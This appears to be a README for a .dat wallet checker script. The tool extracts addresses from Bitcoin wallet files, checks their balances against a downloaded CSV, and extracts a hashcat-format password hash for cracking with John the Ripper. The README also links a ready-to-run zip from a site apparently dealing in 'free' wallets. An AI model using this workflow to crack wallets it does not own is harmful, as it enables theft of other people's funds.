# .dat Wallet Checker

This software is a **.dat wallet checker**.

## Features

- Verifies all `.dat` files in the same folder and request is readable and not corrupted.
- Extracts all addresses contained in the file.
- Compares the extracted addresses against a CSV file to check for balances.
- Extract hashcat hash.

## Usage

1. Provide a valid `.dat` wallet file.
2. Provide a CSV file containing address and balance information.
3. Run the script to check which addresses from the `.dat` file have a balance.

## Requirements

To set up the environment and install the necessary dependencies, follow these steps:


1. sudo apt install -y python3 python3-pip
2. sudo apt install libdb-dev libdb++-dev python3-dev build-essential
3. pip install bsddb3
4. git clone https://github.com/openwall/john.git
5. Download address balance Database (https://privatekey2bitcoin.com/freewallets/utxo.csv)
6. Start

Download all package ready to run: https://privatekey2bitcoin.com/freewallets/datchecker.zip

## Example
📂 Checking file: wallet0.92.dat
✅ File is a valid Berkeley DB wallet.
✅ File passed all checks.
✅ Bitcoin Hash: $bitcoin$64$02fac009c7298c142c27aaf52a10b984bb578f124cb1ed0854fe460f16aa9cf4$16$1dabf1816b34e175$62719$2$00$2$00
💰 Valid addresses with balance found:
   Address: 19wCFh3wAqqWE9SNJu6QyBmCVX68zVGLH5 | Balance: 94953989

